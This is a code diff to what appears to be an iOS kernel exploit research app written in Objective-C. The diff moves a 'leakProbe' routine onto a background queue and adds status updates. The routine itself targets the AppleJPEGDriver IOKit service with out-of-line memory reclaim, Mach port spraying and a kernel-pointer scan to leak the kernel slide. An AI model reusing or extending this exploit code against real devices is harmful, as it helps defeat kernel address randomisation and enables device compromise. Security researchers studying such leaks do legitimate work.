@@ -1356,18 +1356,26 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 
 
 - (void)leakProbe {
+    if (self.running) return;
+    self.running = YES;
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.logView.alpha = 1.0;
+        [self setStatus:@"leak probe running..."];
+    });
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
     [self log:@"=== leakProbe (v4): OOL reclaim + kernel-ptr scan ==="];
     io_service_t svc = [self findJPEGService];
-    if (!svc) { [self log:@"no service"]; return; }
+    if (!svc) { [self log:@"no service"]; self.running = NO; return; }
     BOOL healthy = [self checkDriverHealth:svc];
     [self log:@"driver health: %@", healthy ? @"OK" : @"BROKEN"];
-    if (!healthy) { IOObjectRelease(svc); return; }
+    if (!healthy) { IOObjectRelease(svc); self.running = NO; return; }
 
     const uint32_t W = 2048, H = 2048;
     NSData *jpegData = [self createTestJPEG:W height:H];
     IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
     IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
-    if (!srcSurf || !dstSurf) { IOObjectRelease(svc); return; }
+    if (!srcSurf || !dstSurf) { IOObjectRelease(svc); self.running = NO; return; }
     uint32_t srcID = IOSurfaceGetID(srcSurf);
     uint32_t dstID = IOSurfaceGetID(dstSurf);
 
@@ -1438,5 +1446,10 @@ done:
     mach_port_destroy(mach_task_self(), sprayPort);
     CFRelease(srcSurf); CFRelease(dstSurf); IOObjectRelease(svc);
     [self log:@"=== leakProbe done: kptrs=%d slide=%#llx ===", kptr_total, slide];
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.statusLabel.text = @"DONE";
+    });
+    self.running = NO;
+    });
 }
 @end
